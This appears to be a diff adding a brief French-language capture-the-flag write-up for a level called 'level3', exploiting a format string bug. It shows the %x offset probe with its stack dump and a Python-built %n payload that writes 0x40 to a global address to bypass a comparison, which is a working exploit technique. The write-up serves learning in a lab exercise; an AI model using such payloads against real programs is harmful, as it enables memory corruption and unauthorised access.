@@ -1,0 +1,26 @@
+test de la Format string attack
+on essai d'inserer un %x pour voir s'il est interprete
+
+on cherche l'offset:
+echo "AAAAA`python -c "print ' %x'*10"`" > /tmp/coucou
+cat /tmp/coucou | ./level3
+-> AAAAA 200 b7fd1ac0 b7ff37d0 41414141 78252041 20782520 25207825 78252078 20782520 25207825
+
+on voit que l'offset est a 4 => 41414141 = 'AAAA'
+
+Il y a un format modifier qui nous permet d'écrire en mémoire,
+c'est le modifier %n, qui écrit le nombres de charactères,
+qui le précéde dans la chaine en question
+
+on veut bypass le test:
+mov    eax,ds:0x804988c
+cmp    eax,0x40
+
+donc il faut que 0x804988c = 0x40
+donc on ecrit le test suivant
+
+python -c "print '\x8c\x98\x04\x08' + 'A' * 60 + '%4\$n'" > /tmp/level3
+
+0x40 = 64 donc 4 octets pour l'addresse + 60 octets
+cat /tmp/level3 - | ./level3
+
